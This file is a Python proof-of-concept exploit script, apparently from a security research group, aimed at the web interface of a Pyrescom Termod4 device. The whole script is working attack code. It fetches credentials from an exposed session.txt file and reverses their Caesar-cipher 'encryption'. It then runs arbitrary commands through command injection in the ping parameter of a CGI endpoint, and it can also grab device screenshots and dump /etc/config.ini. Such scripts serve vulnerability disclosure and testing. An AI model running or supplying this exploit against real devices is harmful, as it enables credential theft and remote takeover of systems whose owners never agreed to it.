#!/usr/local/bin/python3
import requests, argparse, sys, urllib
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.request import urlopen

## Parsing arguments
parser = argparse.ArgumentParser(description='Proof of concept exploit for Pyrescom Termod4 web interface. By Outpost24 Ghost Labs\' JM & vdT (@HugovdToorn)')
parser.add_argument('target', type=str.lower, help='Your target URL.')
parser.add_argument('command', nargs='?', default=False, help='Command if you want to attempt RCE.')
parser.add_argument('-s', '--screenshot', help='Show Termod4 interface.', action='store_true')
parser.add_argument('-c', '--config', help='Show Termod4 settings /etc/config.ini.', action='store_true')
parser.add_argument('-v', '--verbose', help='Increase output verbosity.', action='store_true')
args = parser.parse_args()

## Variables
verbose    	= (True if args.verbose else False)
screenshot	= (True if args.screenshot else False)
config		= (True if args.config else False)
target 		= args.target
command 	= args.command

# Text colour
cdef="\033[39m"
cred="\033[31m"
cgreen="\033[32m"
cyellow="\033[33m"
cblue="\033[34m"

# Formatting
fbold="\033[1m"
fdim="\033[2m"
funderline="\033[4m"
fblink="\033[5m"
freverse="\033[7m"
fhidden="\033[8m"

# Resets
res="\033[0m"
resbold="\033[21m"
resdim="\033[22m"
resunderline="\033[24m"
resblink="\033[25m"
resreverse="\033[27m"
reshidden="\033[28m"

# Feedback elements
pos=cgreen+fbold+"[+] "+res
neg=cred+fbold+"[-] "+res
war=cyellow+fbold+"[!] "+res
inf=cblue+fbold+"[i] "+res

def decryptPass(text,s):
	# Kudo's to Tutorialspont for inspiration on a litteral shift instead a-z.
	# https://www.tutorialspoint.com/cryptography_with_python/cryptography_with_python_caesar_cipher.htm
	result = ""
	# transverse the plain text
	for i in range(len(text)):
		char = text[i]
		# Encrypt uppercase characters in plain text
		if (char.isupper()):
			result += chr((ord(char) + s-65) % 26 + 65)
		# Encrypt lowercase characters in plain text
		else:
			result += chr((ord(char) + s - 97) % 26 + 97)
	return result

def getPass():
	# Here resides the flaw, 'encrypted' credentials are stored in /sessions.txt
	print(pos+'Requesting \'encrypted\' data form target.')
	try:
		session = requests.get(target+'/session.txt')
		content = str.split(session.text)
	except Exception as e:
		print(neg+'Could not read content, check connection or target URL.\n    Remove any trailing slashes and ensure to add \'http(s)://\'.')
		print(neg+'Reason:',e)
		sys.exit(1)
	if verbose: print(inf+'Read following values:', content)
	print(pos+'Got encrypted values from session file.\n')

	# Decoding is simple, Ceasar cipher -3....
	print(pos+'Attempting to decrypt values.')
	try:
		encusr = content[0]
		encpwd = content[1]
		username = decryptPass(encusr,-3)
		password = decryptPass(encpwd,-3)
	except Exception as e:
		print(neg+'Could not decode values, no creds no fun.\n')
		print(neg+'Reason:',e)
		sys.exit(1)
	print(war+'Username:',username)
	print(war+'Password:',password)
	print(pos+'Obtained plain credentials!\n')
	return username, password, encusr, encpwd

def execRCE(auth,cmd):
	print(pos+'Attempting RCE.')
	if verbose: print(inf+'RCE command:',command)
	try:
		if " " in cmd:
			cmd = "{"+cmd.replace(" ",",").replace("/","/")+"}" # Nothing
			print(inf+"Using URL-encoded command: "+cmd)
		path = target + '/cgi-bin/cfg.cgi?fonction=160&LANGUE=EN&ping=127;' + cmd + '&visu=0' + auth
		resultpath = target + '/cgi-bin/cfg.cgi?fonction=160&LANGUE=EN&visu=1' + auth

		if verbose: print(inf+'Attacking: ' + path)
		if verbose: print(inf+'Expecting results in: ' + path)

		response = urlopen(path)
		res=requests.get(resultpath)
		soup=BeautifulSoup(res.content,"html.parser")
		output = soup.find_all("td", "log")
		print(war+'Command output:')
		for td in output:
			content = td.contents[0].strip()
			if content == "Ping impossible":
				print(neg+'RCE command could not be executed. Escaping is weird, sorry :(')
				break
			else:
				print('\t'+content)
		print(pos+'RCE complete.\n')

	except Exception as e:
		print(neg+'Could not execute command, whups:', e)

def takeScreenshot(auth):
	print(pos+'Attempting to screenshot target device.')
	#Path is requested to generate new screenshot, then latest screenshot is downloaded from resultpath.
	path = target+'/cgi-bin/cfg.cgi?fonction=221&LANGUE=EN' + auth
	resultpath = target + '/cgi-bin/screenshot.png'
	img = str(datetime.now())+'-Pyrescom.png'

	if verbose: print(inf+'Requesting generation of new screenshot: ' + path)
	genpic = requests.get(path)
	if genpic.status_code == 200:
		print(pos+'Pyrescom device created new screenshot!')
	else:
		print(war+'Could not generate new screenshot, image might be dated!')

	if verbose: print(inf+'Attempting to fetch latest screenshot: ' + resultpath)
	getpic = requests.get(resultpath)
	if getpic.status_code == 200:
		with open(img, 'wb') as f:
			f.write(getpic.content)
		print(pos+'Got image, stored as: ' + img + '.\n')
	else:
		print(neg+'Something went wrong when fetching the screenshot.\n')

def main():
	print(banner())
	username, password, encusr, encpwd = getPass()
	# Auth string below is required to execute commands/functions.
	auth = '&login='+encusr+'&password='+encpwd

	if command:
		execRCE(auth, command)

	if screenshot:
		takeScreenshot(auth)

	if config:
		execRCE(auth, 'cat /etc/config.ini')

	print(pos+'All done.')

def banner():
	banner = str(cblue + """
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXK0OkkkkOKXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXKOxdooooooooodx0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXc      cXXXXl;lXXXXXXXXXXXX0dooooooooooooooood0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
kc  .''''.  ckX. .XXXXXXXXXXXxooooooooooooooooooooxXXXXXXXXXXXXXXXXO  oXXXXXXXXX
;  o0XXXX0o  :X. .0000000KXXkoooooooook0xooooooooooxXXK000000000K00x  c00XXXXXXX
;  0XXXXXXXXXXX.         .:0oo   oooo    oooooooooooxc.         '.       KXXXXXX
;  0XXXXOxxxxOX. .000000c. 'ooo   ox    xoooooooooo;   '00000000000d  c00XXXXXXX
;  0XXXX'    ;X. .XXXXXXXx  oooo oooo  ooooooooooooc,  .,,,,,,OXXXXk  lXXXXXXXXX
;  0XXXXXX0  ;X. .XXXXXXXx  ;ooooooooooooooooooooooooo,;;;;;,  'dXXk  lXXXXXXXXX
c. .oOOOOOx  ;X. .XXXXXXXx  ckooooooooooooooooooooolcccoOOOOd   ,XXO.  ,OXXXXXXX
X0l          ;X. .XXXXxood  lXKxooooooooooooooooooo;          :kXXXXXo.  KXXXXXX
XXXXXXXXXXXXXXXXXXXXXX,  KXXXXXXKOdoooooooooooooooo. :XXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXX,  KXXXXXXXXXKOxooooookK00OOd  :XXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXX,  KXXXXXXXXXXXK  ..''  lOXXk          .dXXXXkc          o
XXXXXXXXXXXXXXXXXXXXXX,  KXXXXXXXXXXXXxxxxxxl  .;Xk  ,xxxxxx.  .kX,   oxxxxxxxx0
XXXXXXXXXXXXXXXXXXXXXX,  KXXXXXXXXXXXXcccccccc  .Xk  :XXXXXXXo  xXl.  :cccccoXXX
XXXXXXXXXXXXXXXXXXXXXX,  KXXXXXXXXXOc. .......  .Xk  :XXXXXXXo  xXXKx....... .o0
XXXXXXXXXXXXXXXXXXXXXX,  0KKKKKKKKK,   lKKKKKK  .Xk  :KKKKKKc.  xXKKKKKKKKK:   c
XX """ + cred + fblink + fbold + """<3 JM & vdT """ + res + cblue + """ XXXXXXXX,            dk;          .Xk          .;XXX.          | 
XXXXXXXXXXXXXXXXXXXXXXxllllllllllllOXXlllllllllldX0llllllllllxXXXXollllllllldXXX""" + res)
	return banner

if __name__ == '__main__':
	main()
